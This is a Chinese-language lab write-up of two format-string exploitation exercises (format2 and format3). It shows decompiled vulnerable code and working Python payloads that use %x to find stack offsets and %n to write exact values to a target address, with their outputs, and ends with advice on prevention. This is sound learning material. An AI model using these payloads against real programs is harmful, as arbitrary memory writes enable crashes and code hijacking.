# <center>格式化字符串实验2</center>

## 实验概述

### 【目的】
1. 运行format2,得到输出`you have modified the target :)`
### 【环境】
Linux
### 【工具】
python
### 【原理】
格式化字符串，是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。[1]
## 实验步骤

### 【步骤】
#### format2
IDA pro 定位到关键函数。
```c
int vuln()
{
  char s; // [sp+Ch] [bp-20Ch]@1
  int v2; // [sp+20Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  fgets(&s, 512, stdin);
  printf(&s);
  if ( target == 64 )
    puts("you have modified the target :)");
  else
    printf("target is %d :(\n", target);
  return *MK_FP(__GS__, 20) ^ v2;
}
```
target的地址
```
.bss:0804A048 target          dd ?                    ; DATA XREF: vuln+43r
.bss:0804A048                                         ; vuln:loc_804854Ar
.bss:0804A048 _bss            ends
```
与format1不同的是，这里要求精确控制target的的值为64。
跟上一题一样，先查找format参数的偏移量。
```
$ python -c 'print "AAAA"+".".join(["%d:%%x" % i for i in range(1,16)])' | ./format2
AAAA1:200.2:f7fb65a0.3:f7ff0f8a.4:f7e0c008.5:f7fd41a8.6:f7ffcf1c.7:41414141.8:78253a31.9:253a322e.10:3a332e78.11:342e7825.12:2e78253a.13:78253a35.14:253a362e.15:3a372e78
target is 0 :(

```
尝试修改target变量的值
```
$ python -c 'print "\x48\xa0\x04\x08%7$n"' | ./format2
H�
target is 4 :(

```
这里target的值被改写成为4，要使target的值为64，需要在%n前面再多输出60个字符，c语言中，`%`后可以接数字表示输出的位数，那么要输出60个字符，就可以使用`%60d`。
```
$ python -c 'print "\x48\xa0\x04\x08%60d%7$n"' | ./format2
H�                                                         512
you have modified the target :)

```

#### format3

```
int vuln()
{
  char s; // [sp+Ch] [bp-20Ch]@1
  int v2; // [sp+20Ch] [bp-Ch]@1

  v2 = *MK_FP(__GS__, 20);
  fgets(&s, 512, stdin);
  printbuffer(&s);
  if ( target == 0x1025544 )
    puts("you have modified the target :)");
  else
    printf("target is %08x :(\n", target);
  return *MK_FP(__GS__, 20) ^ v2;
}
.bss:0804A048                 public target
.bss:0804A048 target          dd ?                    ; DATA XREF: vuln+43r
.bss:0804A048                                         ; vuln:loc_8048563r
.bss:0804A048 _bss            ends
```
这里要求target = 0x01025544，由于%n一次只能输入一个字节，所以我们需要调用四次%n来改写target的值。
先寻找偏移量是多少。
```
$ python -c 'print "AAAA"+".".join(["%d:%%x" % i for i in range(1,16)])' | ./format3
AAAA1:f7feeff0.2:f7e6362b.3:0.4:f7fb6000.5:f7fb6000.6:ffffcf58.7:8048542.8:ffffcd4c.9:200.10:f7fb65a0.11:f7ff0f8a.12:f7e0c008.13:f7fd41a8.14:f7ffcf1c.15:41414141
$ python -c 'print "ABCD" + "X" * 4 + "%15$x."' | ./format3
ABCDXXXX44434241.
target is 00000000 :(

```
确定了偏移量是15，先尝试一下修改。
```
$ python -c 'print "\x48\xa0\x04\x08"  + "%64d%15$n."' | ./format3
H�                                                      -134287376.
target is 00000044 :(

```
成功修改了最低一位的值，再尝试修改两位。
```
$ python -c 'print "\x48\xa0\x04\x08\x49\xa0\x04\x08"  + "%60d%15$n%17d%16$n"' | ./format3
H�I�                                                  -134287376       -135907797
target is 00005544 :(

```
注意，这里前面的地址输入了8位，那么后面的位数也要相应的减去4，可以看到原本的%64d变成了%60d。
现在要控制第三位的值，考虑到需要把值改为0x02，而0x55大于0x02，此时需要溢出到258。因为258刚好是0x0102，所以此时已经满足条件。
```
$ python -c 'print "\x48\xa0\x04\x08\x49\xa0\x04\x08\x4a\xa0\x04\x08"  + "%56d%15$n%17d%16$n%173d%17$n"' | ./format3
H�I�J�                                              -134287376       -135907797                                                                                                                                                                            0
you have modified the target :)

```



### 【总结】
本次实验主要进一步熟悉了通过%x泄露内存数据，通过%n来进行任意地址写，通过%`x`d来控制输出x个字符。

可以发现，格式化字符串漏洞发生的原因是程序将格式化字符串的权限交给用户，即用户可以操作格式化字符串的内容。

要预防这类情况，在使用格式化字符串函数时，format参数的权限一定不能交给用户。
